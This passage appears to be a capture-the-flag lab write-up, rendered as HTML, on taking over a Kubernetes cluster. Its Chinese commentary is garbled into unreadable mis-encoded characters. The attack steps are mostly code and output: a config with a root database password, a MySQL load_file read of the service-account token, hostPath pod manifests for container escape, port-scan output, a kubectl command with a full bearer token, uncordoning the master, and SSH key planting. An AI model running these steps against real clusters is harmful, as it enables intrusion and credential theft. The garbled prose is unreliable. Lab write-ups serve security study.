class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">returnarray</span> (</span><br><span class="line"><span class="string">&#x27;db&#x27;</span> =&gt; </span><br><span class="line"><span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;host&#x27;</span> =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dbname&#x27;</span> =&gt; <span class="string">&#x27;jizhicms&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;Mysqlroot@!123&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;jz_&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;port&#x27;</span> =&gt; <span class="string">&#x27;3306&#x27;</span>,</span><br><span class="line">  ),</span><br><span class="line"><span class="string">&#x27;redis&#x27;</span> =&gt; </span><br><span class="line"><span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;SAVE_HANDLE&#x27;</span> =&gt; <span class="string">&#x27;Redis&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;HOST&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PORT&#x27;</span> =&gt; <span class="number">6379</span>,</span><br><span class="line">    <span class="string">&#x27;AUTH&#x27;</span> =&gt; <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">&#x27;TIMEOUT&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;RESERVED&#x27;</span> =&gt; <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">&#x27;RETRY_INTERVAL&#x27;</span> =&gt; <span class="number">100</span>,</span><br><span class="line">    <span class="string">&#x27;RECONNECT&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&#x27;EXPIRE&#x27;</span> =&gt; <span class="number">1800</span>,</span><br><span class="line">  ),</span><br><span class="line"><span class="string">&#x27;APP_DEBUG&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿æ¥æ•°æ®åº“ï¼Œæ•°æ®åº“å¯ä»¥udfææƒï¼ˆä»harboræ‹‰å–çš„é•œåƒä¸­çš„é…ç½®æ–‡ä»¶å¯ä»¥å¾—åˆ°ï¼‰ï¼Œè¯»å–k8sçš„token</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">load_file</span>(<span class="params"><span class="string">&quot;/var/run/secrets/kubernetes.io/serviceaccount/token&quot;</span></span>)</span>;</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20241222033229363.png" alt="image-20241222033229363"></p><p>åˆ©ç”¨tokenæˆåŠŸç™»å½•dashboardï¼Œåˆ›å»ºä¸€ä¸ªå®¹å™¨æŒ‚è½½é€ƒé€¸</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">apiVersion</span><span class="punctuation">:</span> <span class="string">v1</span></span><br><span class="line"><span class="attribute">kind</span><span class="punctuation">:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attribute">metadata</span><span class="punctuation">:</span></span><br><span class="line">  <span class="attribute">name</span><span class="punctuation">:</span> <span class="string">chuling</span></span><br><span class="line"><span class="attribute">spec</span><span class="punctuation">:</span></span><br><span class="line">  <span class="attribute">containers</span><span class="punctuation">:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">image: 172.22.18.64/hospital/jizhicms:2.5.0</span></span><br><span class="line">    <span class="attribute">name</span><span class="punctuation">:</span> <span class="string">test-container</span></span><br><span class="line">    <span class="attribute">volumeMounts</span><span class="punctuation">:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">mountPath: /tmp</span></span><br><span class="line">      <span class="attribute">name</span><span class="punctuation">:</span> <span class="string">test-volume</span></span><br><span class="line">  <span class="attribute">volumes</span><span class="punctuation">:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">name: test-volume</span></span><br><span class="line">    <span class="attribute">hostPath</span><span class="punctuation">:</span></span><br><span class="line">      <span class="attribute">path</span><span class="punctuation">:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20241222033245493.png" alt="image-20241222033245493"></p><h2 id="flag5">flag5</h2><p>masterèŠ‚ç‚¹</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh</span>-keygen -t rsa -b <span class="number">4096</span></span><br></pre></td></tr></table></figure><p>å†™å…¬é’¥è¿›è¡Œé€ƒé€¸ï¼Œæˆ‘è¿™é‡Œæ˜¯æŒ‚è½½åˆ°äº†node1èŠ‚ç‚¹ä¸Šï¼Œæè‡´cmsä¹Ÿæ˜¯åœ¨node1ï¼Œæ‰€ä»¥çŒœæµ‹node1å°±æ˜¯61é‚£å°æœºå™¨ï¼Œå°è¯•è¿æ¥æˆåŠŸ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20241222033309167.png" alt="image-20241222033309167"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">(icmp) Target <span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">45</span>    is alive</span><br><span class="line">(icmp) Target <span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">44</span>    is alive</span><br><span class="line">(icmp) Target <span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">75</span>    is alive</span><br><span class="line"><span class="string">[*]</span> Icmp alive hosts len is: <span class="number">3</span></span><br><span class="line"><span class="number">172.22.15.45:80</span> open</span><br><span class="line"><span class="number">172.22.15.75:22</span> open</span><br><span class="line"><span class="number">172.22.15.44:22</span> open</span><br><span class="line"><span class="number">172.22.15.45:22</span> open</span><br><span class="line"><span class="number">172.22.15.44:111</span> open</span><br><span class="line"><span class="number">172.22.15.45:111</span> open</span><br><span class="line"><span class="number">172.22.15.75:111</span> open</span><br><span class="line"><span class="number">172.22.15.75:179</span> open</span><br><span class="line"><span class="number">172.22.15.44:179</span> open</span><br><span class="line"><span class="number">172.22.15.45:179</span> open</span><br><span class="line"><span class="number">172.22.15.75:2380</span> open</span><br><span class="line"><span class="number">172.22.15.75:2379</span> open</span><br><span class="line"><span class="number">172.22.15.75:5000</span> open</span><br><span class="line"><span class="number">172.22.15.75:6443</span> open</span><br><span class="line"><span class="number">172.22.15.44:9094</span> open</span><br><span class="line"><span class="number">172.22.15.45:9253</span> open</span><br><span class="line"><span class="number">172.22.15.44:9253</span> open</span><br><span class="line"><span class="number">172.22.15.75:9253</span> open</span><br><span class="line"><span class="number">172.22.15.75:9353</span> open</span><br><span class="line"><span class="number">172.22.15.44:9353</span> open</span><br><span class="line"><span class="number">172.22.15.45:9353</span> open</span><br><span class="line"><span class="number">172.22.15.75:10259</span> open</span><br><span class="line"><span class="number">172.22.15.75:10257</span> open</span><br><span class="line"><span class="number">172.22.15.75:10256</span> open</span><br><span class="line"><span class="number">172.22.15.44:10256</span> open</span><br><span class="line"><span class="number">172.22.15.45:10256</span> open</span><br><span class="line"><span class="number">172.22.15.75:10250</span> open</span><br><span class="line"><span class="number">172.22.15.44:10250</span> open</span><br><span class="line"><span class="number">172.22.15.44:10249</span> open</span><br><span class="line"><span class="number">172.22.15.75:10249</span> open</span><br><span class="line"><span class="number">172.22.15.44:10248</span> open</span><br><span class="line"><span class="number">172.22.15.75:10248</span> open</span><br><span class="line"><span class="number">172.22.15.45:10250</span> open</span><br><span class="line"><span class="number">172.22.15.45:10249</span> open</span><br><span class="line"><span class="number">172.22.15.45:10248</span> open</span><br><span class="line"><span class="number">172.22.15.75:30020</span> open</span><br><span class="line"><span class="number">172.22.15.44:30020</span> open</span><br><span class="line"><span class="number">172.22.15.45:30020</span> open</span><br><span class="line"><span class="number">172.22.15.44:32686</span> open</span><br><span class="line"><span class="number">172.22.15.45:32686</span> open</span><br><span class="line"><span class="number">172.22.15.75:32686</span> open</span><br><span class="line"><span class="string">[*]</span> alive ports len is: <span class="number">41</span></span><br><span class="line">start vulscan</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">45</span>:<span class="number">9253</span>  code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">75</span>:<span class="number">9353</span>  code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: https://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">75</span>:<span class="number">32686</span> code:<span class="number">200</span> len:<span class="number">1422</span>   title:Kubernetes Dashboard</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">44</span>:<span class="number">10249</span> code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">44</span>:<span class="number">9353</span>  code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[+]</span> InfoScan:https://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">75</span>:<span class="number">32686</span> <span class="string">[Kubernetes]</span> </span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">44</span>:<span class="number">9253</span>  code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">45</span>:<span class="number">10248</span> code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">75</span>:<span class="number">9253</span>  code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">44</span>:<span class="number">9094</span>  code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">44</span>:<span class="number">10248</span> code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">75</span>:<span class="number">5000</span>  code:<span class="number">200</span> len:<span class="number">0</span>      title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">75</span>:<span class="number">10249</span> code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">75</span>:<span class="number">10256</span> code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">45</span>:<span class="number">9353</span>  code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">45</span>:<span class="number">10249</span> code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">44</span>:<span class="number">10256</span> code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: https://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">45</span>:<span class="number">10250</span> code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: https://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">44</span>:<span class="number">32686</span> code:<span class="number">200</span> len:<span class="number">1422</span>   title:Kubernetes Dashboard</span><br><span class="line"><span class="string">[*]</span> WebTitle: https://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">44</span>:<span class="number">10250</span> code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">75</span>:<span class="number">10248</span> code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: https://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">75</span>:<span class="number">6443</span> code:<span class="number">401</span> len:<span class="number">157</span>    title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: https://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">75</span>:<span class="number">10257</span> code:<span class="number">403</span> len:<span class="number">217</span>    title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: https://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">75</span>:<span class="number">10250</span> code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[+]</span> InfoScan:https://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">44</span>:<span class="number">32686</span> <span class="string">[Kubernetes]</span> </span><br><span class="line"><span class="string">[*]</span> WebTitle: http://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">45</span>:<span class="number">10256</span> code:<span class="number">404</span> len:<span class="number">19</span>     title:None</span><br><span class="line"><span class="string">[*]</span> WebTitle: https://<span class="number">172</span>.<span class="number">22</span>.<span class="number">15</span>.<span class="number">75</span>:<span class="number">10259</span> code:<span class="number">403</span> len:<span class="number">217</span>    title:None</span><br></pre></td></tr></table></figure><p>æ–°çš„ä»£ç† socks5://172.22.18.61:10000</p><p>å‘ç°å­˜åœ¨6443ç«¯å£ï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šæ˜¯masterèŠ‚ç‚¹äº†ï¼Œå¸¦ä¸Šæˆ‘ä»¬ä¹‹å‰è·å–çš„tokenå»å°è¯•æ§åˆ¶æ•´ä¸ªk8s</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl -s https://<span class="number">172.22</span>.<span class="number">15.75</span>:<span class="number">6443</span>/ --insecure-skip-tls-verify<span class="operator">=</span><span class="keyword">true</span> --token<span class="operator">=</span>eyJhbGciOiJSUzI<span class="number">1</span>NiIsImtpZCI<span class="number">6</span>IlRSaDd<span class="number">3</span>eFBhYXFNTkg<span class="number">5</span>OUh<span class="number">0</span>TnNwcW<span class="number">00</span><span class="keyword">c</span><span class="number">0</span>Zpand<span class="number">4</span>LUliXzNHRU<span class="number">1</span>raXFjTzQifQ.eyJhdWQiOlsiYXBpIiwiaXN<span class="number">0</span>aW<span class="number">8</span>tY<span class="number">2</span>EiXSwiZXhwIjoxNzY<span class="number">2</span>MzMyNTkzLCJpYXQiOjE<span class="number">3</span>MzQ<span class="number">3</span>OTY<span class="number">1</span>OTMsImlzcyI<span class="number">6</span>Imh<span class="number">0</span>dHBzOi<span class="number">8</span>va<span class="number">3</span>ViZXJuZXRlcy<span class="number">5</span>kZWZhdWx<span class="number">0</span>LnN<span class="number">2</span>YyIsImp<span class="number">0</span>aSI<span class="number">6</span>IjZhMTgzYzRhLTQ<span class="number">1</span>NTgtNDhhMi<span class="number">04</span>Y<span class="number">2</span>Q<span class="number">0</span>LTk<span class="number">4</span>MmVmMjJhY<span class="number">2</span>ZlMyIsImt<span class="number">1</span>YmVybmV<span class="number">0</span>ZXMuaW<span class="number">8</span>iOnsibmFtZXNwYWNlIjoiZGVmYXVsdCIsIm<span class="number">5</span>vZGUiOnsibmFtZSI<span class="number">6</span>Im<span class="number">5</span>vZGUyIiwidWlkIjoiYjAzYjUwZTgtOTBkOS<span class="number">00</span>YjdkLWFmM<span class="number">2</span>EtMGZiMjY<span class="number">3</span>MWUyNjFmIn<span class="number">0</span>sInBvZCI<span class="number">6</span>eyJuYW<span class="number">1</span>lIjoibXlzcWwtNmRmODc<span class="number">2</span>ZDZkYy<span class="number">1</span>mNnFmZyIsInVpZCI<span class="number">6</span>ImNmMzMyYjUxLWM<span class="number">2</span>NDYtNDExNi<span class="number">04</span>ZGRhLTFmMDJiZTAyM<span class="number">2</span>FmZSJ<span class="number">9</span>LCJzZXJ<span class="number">2</span>aWNlYWNjb<span class="number">3</span>VudCI<span class="number">6</span>eyJuYW<span class="number">1</span>lIjoibXlzcWwiLCJ<span class="number">1</span>aWQiOiJhNTMyNDZlNy<span class="number">0</span>yZDFkLTQxMzMtOGM<span class="number">4</span>OS<span class="number">05</span>ZGNhMWI<span class="number">5</span>YmIxNGYifSwid<span class="number">2</span>FybmFmdGVyIjoxNzM<span class="number">0</span>ODAwMjAwfSwibmJmIjoxNzM<span class="number">0</span>Nzk<span class="number">2</span>NTkzLCJzdWIiOiJzeXN<span class="number">0</span>ZW<span class="number">06</span><span class="keyword">c</span><span class="number">2</span>VydmljZWFjY<span class="number">291</span>bnQ<span class="number">6</span>ZGVmYXVsdDpteXNxbCJ<span class="number">9</span>.N<span class="number">0</span>NPwdfTCfxNaQ<span class="number">8</span>HUv<span class="number">8</span>FwThLYOwY<span class="number">2</span>pHQ<span class="number">9</span>fcFzs<span class="number">7</span>VyDgnqBDMjjrViVxOxlaSCPG_WPnLwwJUp<span class="number">5</span>BKS<span class="number">3</span>Dm<span class="number">0</span>gTiHnvP<span class="number">7</span>oA<span class="number">7</span><span class="keyword">c</span><span class="number">0</span>HQ<span class="number">3</span>HSMTk_A<span class="number">9</span>D<span class="number">9</span>Ty<span class="number">5</span>MFyViWSVazon<span class="number">416</span>QyQpW<span class="number">0</span>xRVVIrnufKMPd<span class="number">62</span>vurMel<span class="number">5</span>eaLlYvU-hkQInPOenSAFmpBdoCXCWY<span class="number">93</span>-hPvJ<span class="number">7</span>p<span class="number">4</span>fDwmSZsSdVY<span class="number">7</span>CpZSHlKDWFWXinHGVg<span class="number">5E0</span>FWJYDYmAP<span class="number">61</span>f<span class="number">0</span>rAKEVMpl<span class="number">82</span>YdMcrGXQWljmPwoDe<span class="number">2</span>kS<span class="number">1</span>DSH<span class="number">9</span>l-j<span class="number">9</span>vejn<span class="number">3</span>RkuIW<span class="number">1</span>hyUS<span class="number">7</span>NJv_Sx<span class="number">9</span>CvQkeJvxMFO_LmRUGMy<span class="number">0</span>u<span class="number">8</span>wzE_WgvK<span class="number">50</span>KTN<span class="number">2</span>qOaSQ describe nodes</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20241222033346846.png" alt="image-20241222033346846"></p><p>æ¢å¤å¯è°ƒåº¦çŠ¶æ€</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">kubectl</span></span> ......uncordon master</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20241222033403009.png" alt="image-20241222033403009"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20241222033408595.png" alt="image-20241222033408595"></p><p>æŠŠtaintsåˆ æ‰ï¼Œä¸Šé¢é‚£ä¸ªæ“ä½œé¡ºé“å°±åˆ äº†ï¼Œåˆ›å»ºæ–°dockerï¼ŒæŒ‚è½½é€ƒé€¸</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">apiVersion</span><span class="punctuation">:</span> <span class="string">v1</span></span><br><span class="line"><span class="attribute">kind</span><span class="punctuation">:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attribute">metadata</span><span class="punctuation">:</span></span><br><span class="line">  <span class="attribute">name</span><span class="punctuation">:</span> <span class="string">control-master-x</span></span><br><span class="line"><span class="attribute">spec</span><span class="punctuation">:</span></span><br><span class="line"> <span class="attribute">tolerations</span><span class="punctuation">:</span></span><br><span class="line">   <span class="bullet">-</span> <span class="string">key: node-role.kubernetes.io/master</span></span><br><span class="line">     <span class="attribute">operator</span><span class="punctuation">:</span> <span class="string">Exists</span></span><br><span class="line">     <span class="attribute">effect</span><span class="punctuation">:</span> <span class="string">NoSchedule</span></span><br><span class="line"> <span class="attribute">containers</span><span class="punctuation">:</span></span><br><span class="line">   <span class="bullet">-</span> <span class="string">name: control-master-x</span></span><br><span class="line">     <span class="attribute">image</span><span class="punctuation">:</span> <span class="string">172.22.18.64/public/mysql:5.6</span></span><br><span class="line">     <span class="attribute">command</span><span class="punctuation">:</span> <span class="string">[&quot;/bin/sleep&quot;, &quot;3650d&quot;]</span></span><br><span class="line">     <span class="attribute">volumeMounts</span><span class="punctuation">:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">name: master</span></span><br><span class="line">        <span class="attribute">mountPath</span><span class="punctuation">:</span> <span class="string">/tmp</span></span><br><span class="line"> <span class="attribute">volumes</span><span class="punctuation">:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">name: master</span></span><br><span class="line">    <span class="attribute">hostPath</span><span class="punctuation">:</span></span><br><span class="line">     <span class="attribute">path</span><span class="punctuation">:</span> <span class="string">/</span></span><br><span class="line">     <span class="attribute">type</span><span class="punctuation">:</span> <span class="string">Directory</span></span><br></pre></td></tr></table></figure><h2 id="flag6">flag6</h2><p>node2èŠ‚ç‚¹ï¼Œåˆ†é…ä¸è¿‡å»ï¼Œæ‰€ä»¥è¿˜æ˜¯å†™ä¸ªnodeSelectorå§ï¼ŒæŒ‡å®šåˆ°node2ä¸‹</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">apiVersion</span><span class="punctuation">:</span> <span class="string">v1</span></span><br><span class="line"><span class="attribute">kind</span><span class="punctuation">:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attribute">metadata</span><span class="punctuation">:</span></span><br><span class="line">  <span class="attribute">name</span><span class="punctuation">:</span> <span class="string">control-master-x1</span></span><br><span class="line"><span class="attribute">spec</span><span class="punctuation">:</span></span><br><span class="line"> <span class="attribute">tolerations</span><span class="punctuation">:</span></span><br><span class="line">   <span class="bullet">-</span> <span class="string">key: node-role.kubernetes.io/master</span></span><br><span class="line">     <span class="attribute">operator</span><span class="punctuation">:</span> <span class="string">Exists</span></span><br><span class="line">     <span class="attribute">effect</span><span class="punctuation">:</span> <span class="string">NoSchedule</span></span><br><span class="line"> <span class="attribute">containers</span><span class="punctuation">:</span></span><br><span class="line">   <span class="bullet">-</span> <span class="string">name: control-master-x</span></span><br><span class="line">     <span class="attribute">image</span><span class="punctuation">:</span> <span class="string">172.22.18.64/public/mysql:5.6</span></span><br><span class="line">     <span class="attribute">command</span><span class="punctuation">:</span> <span class="string">[&quot;/bin/sleep&quot;, &quot;3650d&quot;]</span></span><br><span class="line">     <span class="attribute">volumeMounts</span><span class="punctuation">:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">name: master</span></span><br><span class="line">        <span class="attribute">mountPath</span><span class="punctuation">:</span> <span class="string">/tmp</span></span><br><span class="line"> <span class="attribute">volumes</span><span class="punctuation">:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">name: master</span></span><br><span class="line">    <span class="attribute">hostPath</span><span class="punctuation">:</span></span><br><span class="line">     <span class="attribute">path</span><span class="punctuation">:</span> <span class="string">/</span></span><br><span class="line">     <span class="attribute">type</span><span class="punctuation">:</span> <span class="string">Directory</span></span><br><span class="line"> <span class="attribute">nodeSelector</span><span class="punctuation">:</span></span><br><span class="line">    <span class="attribute">kubernetes.io/hostname</span><span class="punctuation">:</span> <span class="string">node2</span></span><br></pre></td></tr></table></figure><h2 id="flag7">flag7</h2><p>å›åˆ°masterèŠ‚ç‚¹ï¼Œå†™å…¬é’¥å¼€å¹²</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">eth0</span>: flags=<span class="number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="number">1500</span></span><br><span class="line">        <span class="attribute">inet</span> <span class="number">172.22.15.75</span>  netmask <span class="number">255.255.0.0</span>  broadcast <span class="number">172.22.255.255</span></span><br><span class="line">        <span class="attribute">inet6</span> fe80::<span class="number">216</span>:<span class="number">3</span>eff:fe1b:<span class="number">8</span>d07  prefixlen <span class="number">64</span>  scopeid <span class="number">0</span>x20&lt;link&gt;</span><br><span class="line">        <span class="attribute">ether</span> <span class="number">00</span>:<span class="number">16</span>:<span class="number">3</span>e:<span class="number">1</span>b:<span class="number">8</span>d:<span class="number">07</span>  txqueuelen <span class="number">1000</span>  (Ethernet)</span><br><span class="line">        <span class="attribute">RX</span> packets <span class="number">347361</span>  bytes <span class="number">230265054</span> (<span class="number">219</span>.<span class="number">5</span> MiB)</span><br><span class="line">        <span class="attribute">RX</span> errors <span class="number">0</span>  dropped <span class="number">0</span>  